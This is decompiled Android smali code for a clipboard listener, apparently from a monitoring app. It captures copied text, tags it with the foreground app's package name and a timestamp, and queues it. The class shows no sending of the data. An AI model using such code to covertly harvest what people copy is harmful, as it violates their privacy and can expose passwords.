.class public Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;
.super Ljava/lang/Object;
.source "ClipboardListener.java"

# interfaces
.implements Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/ClipboardData;",
            ">;"
        }
    .end annotation
.end field

.field protected clipboardManager:Landroid/content/ClipboardManager;

.field private interceptionInteral:I

.field private lastInterception:Ljava/lang/Long;


# direct methods
.method public constructor <init>(Landroid/content/ClipboardManager;Lcom/hp/vd/data/concurrency/BlockingQueue;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ClipboardManager;",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/ClipboardData;",
            ">;)V"
        }
    .end annotation

    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 17
    iput-object v0, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->lastInterception:Ljava/lang/Long;

    const/16 v0, 0x12c

    .line 20
    iput v0, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->interceptionInteral:I

    .line 24
    iput-object p1, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->clipboardManager:Landroid/content/ClipboardManager;

    .line 25
    iput-object p2, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    return-void
.end method


# virtual methods
.method protected intervalHasExpired()Z
    .locals 9

    .line 62
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    .line 65
    iget-object v1, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->lastInterception:Ljava/lang/Long;

    const/4 v2, 0x1

    if-nez v1, :cond_0

    .line 66
    iput-object v0, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->lastInterception:Ljava/lang/Long;

    return v2

    .line 71
    :cond_0
    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    iget-object v1, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->lastInterception:Ljava/lang/Long;

    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    iget v1, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->interceptionInteral:I

    int-to-long v3, v1

    cmp-long v1, v7, v3

    if-gez v1, :cond_1

    const/4 v0, 0x0

    return v0

    .line 75
    :cond_1
    iput-object v0, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->lastInterception:Ljava/lang/Long;

    return v2
.end method

.method public onPrimaryClipChanged()V
    .locals 2

    .line 31
    iget-object v0, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->clipboardManager:Landroid/content/ClipboardManager;

    invoke-virtual {v0}, Landroid/content/ClipboardManager;->hasPrimaryClip()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    .line 37
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->clipboardManager:Landroid/content/ClipboardManager;

    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClipDescription()Landroid/content/ClipDescription;

    move-result-object v0

    const-string v1, "text/plain"

    .line 38
    invoke-virtual {v0, v1}, Landroid/content/ClipDescription;->hasMimeType(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "text/html"

    invoke-virtual {v0, v1}, Landroid/content/ClipDescription;->hasMimeType(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1

    return-void

    .line 44
    :cond_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->intervalHasExpired()Z

    move-result v0

    if-nez v0, :cond_2

    return-void

    .line 50
    :cond_2
    new-instance v0, Lcom/hp/vd/data/ClipboardData;

    invoke-direct {v0}, Lcom/hp/vd/data/ClipboardData;-><init>()V

    .line 52
    sget-object v1, Lcom/hp/vd/ServiceMain;->lastForegroundPackageName:Ljava/lang/String;

    iput-object v1, v0, Lcom/hp/vd/data/ClipboardData;->packageName:Ljava/lang/String;

    .line 53
    iget-object v1, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->clipboardManager:Landroid/content/ClipboardManager;

    invoke-virtual {v1}, Landroid/content/ClipboardManager;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ClipboardData;->content:Ljava/lang/String;

    .line 54
    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    iput-object v1, v0, Lcom/hp/vd/data/ClipboardData;->createdAt:Ljava/util/Date;

    .line 56
    iget-object v1, p0, Lcom/hp/vd/module/monitor/clipboard/ClipboardListener;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {v1, v0}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z

    return-void
.end method
